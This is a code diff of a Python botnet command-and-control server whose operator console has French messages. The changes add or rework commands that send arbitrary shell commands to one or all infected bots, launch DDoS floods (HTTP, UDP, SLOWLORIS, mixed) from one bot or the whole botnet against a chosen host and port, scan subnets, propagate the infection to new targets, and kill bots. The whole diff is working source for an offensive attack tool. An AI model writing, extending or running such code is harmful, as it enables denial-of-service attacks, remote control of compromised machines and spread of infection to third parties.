@@ -234,7 +234,7 @@ def command_interface():
                 else:
                     print("\n=== Bots connectés ===")
                     for i, bot in enumerate(connected_bots):
-                        print(f"{i}. IP: {bot['ip']} | Hostname: {bot['hostname']} | Arch: {bot['arch']} | Connecté depuis: {bot['connected_time']}")
+                        print(f"{i}. IP: {bot['ip']} | Connecté depuis: {bot['connected_time']}")
                     print(f"Total: {len(connected_bots)}")
         
         elif cmd_parts[0] == "info" and len(cmd_parts) > 1:
@@ -247,39 +247,61 @@ def command_interface():
                         bot = connected_bots[bot_index]
                         print(f"\n=== Informations du bot {bot_index} ===")
                         print(f"IP: {bot['ip']}")
-                        print(f"Hostname: {bot['hostname']}")
-                        print(f"Architecture: {bot['arch']}")
                         print(f"Connecté depuis: {bot['connected_time']}")
                         print(f"Informations système:\n{bot['system_info']}")
                         print(f"Tâches récentes: {', '.join(bot['tasks'][-5:]) if bot['tasks'] else 'Aucune'}")
             except ValueError:
                 print("[!] Index de bot invalide")
-            os.system('cls' if os.name == 'nt' else 'clear')
-            return
-            
-        if command == "EXIT":
-            print("[*] Fermeture du serveur C2...")
-            cleanup()
-            return "EXIT"
-            
-        if command == "DDOS":
-            if len(parts) != 4:
-                print("[!] Usage: DDOS <target>:<port> <time> <method>")
-                print("    Methods: HTTP, UDP, TCP, SLOWLORIS, ACK, MIX")
-                return
+        
+        elif cmd_parts[0] == "cmd" and len(cmd_parts) > 2:
+            try:
+                bot_index = int(cmd_parts[1])
+                command = ' '.join(cmd_parts[2:])
+                send_command_to_bot(bot_index, f"CMD {command}")
+                print(f"[+] Commande envoyée au bot {bot_index}")
+            except ValueError:
+                print("[!] Format invalide. Utilisez: cmd <id> <commande>")
+        
+        elif cmd_parts[0] == "broadcast" and len(cmd_parts) > 1:
+            command = ' '.join(cmd_parts[1:])
+            count = broadcast_command(f"CMD {command}")
+            print(f"[+] Commande envoyée à {count} bots")
+        
+        elif cmd_parts[0] == "ddos" and len(cmd_parts) >= 4:
+            try:
+                bot_index = int(cmd_parts[1])
+                target = cmd_parts[2]
+                duration = cmd_parts[3]
+                method = cmd_parts[4] if len(cmd_parts) > 4 else "mix"
                 
-            target_port = parts[1]
-            if ":" not in target_port:
-                print("[!] Format invalide. Utilisez: <target>:<port>")
-                return
+                if ":" not in target:
+                    target = f"{target}:80"  # Port par défaut si non spécifié
                 
-            target, port = target_port.split(":")
+                command = f"DDOS {target} {duration} {method}"
+                send_command_to_bot(bot_index, command)
+                print(f"[+] Attaque DDoS lancée depuis le bot {bot_index} vers {target}")
+            except ValueError:
+                print("[!] Format invalide. Utilisez: ddos <id> <cible> <durée> [méthode]")
+        
+        elif cmd_parts[0] == "ddos-all" and len(cmd_parts) >= 3:
+            target = cmd_parts[1]
+            duration = cmd_parts[2]
+            method = cmd_parts[3] if len(cmd_parts) > 3 else "mix"
+            
+            if ":" not in target:
+                target = f"{target}:80"  # Port par défaut si non spécifié
+            
+            command = f"DDOS {target} {duration} {method}"
+            count = broadcast_command(command)
+            print(f"[+] Attaque DDoS lancée depuis {count} bots vers {target}")
+        
         elif cmd_parts[0] == "scan" and len(cmd_parts) > 2:
             try:
                 bot_index = int(cmd_parts[1])
                 subnet = cmd_parts[2]
                 command = f"SCAN {subnet}"
                 send_command_to_bot(bot_index, command)
+                print(f"[+] Scan lancé depuis le bot {bot_index}")
             except ValueError:
                 print("[!] Format invalide. Utilisez: scan <id> <plage>")
         
@@ -289,6 +311,7 @@ def command_interface():
                 target = cmd_parts[2]
                 command = f"PROPAGATE {target}"
                 send_command_to_bot(bot_index, command)
+                print(f"[+] Propagation lancée depuis le bot {bot_index} vers {target}")
             except ValueError:
                 print("[!] Format invalide. Utilisez: propagate <id> <cible>")
         
@@ -296,18 +319,24 @@ def command_interface():
             try:
                 bot_index = int(cmd_parts[1])
                 send_command_to_bot(bot_index, "PING")
+                print(f"[+] Ping envoyé au bot {bot_index}")
             except ValueError:
                 print("[!] Index de bot invalide")
         
         elif cmd_parts[0] == "ping-all":
-            broadcast_command("PING")
+            count = broadcast_command("PING")
+            print(f"[+] Ping envoyé à {count} bots")
         
         elif cmd_parts[0] == "kill" and len(cmd_parts) > 1:
             try:
                 bot_index = int(cmd_parts[1])
                 send_command_to_bot(bot_index, "EXIT")
+                print(f"[+] Commande de terminaison envoyée au bot {bot_index}")
             except ValueError:
                 print("[!] Index de bot invalide")
+        
+        elif cmd_parts[0] == "clear":
+            os.system('cls' if os.name == 'nt' else 'clear')
         
         elif cmd_parts[0] == "exit":
             print("[!] Arrêt du serveur...")
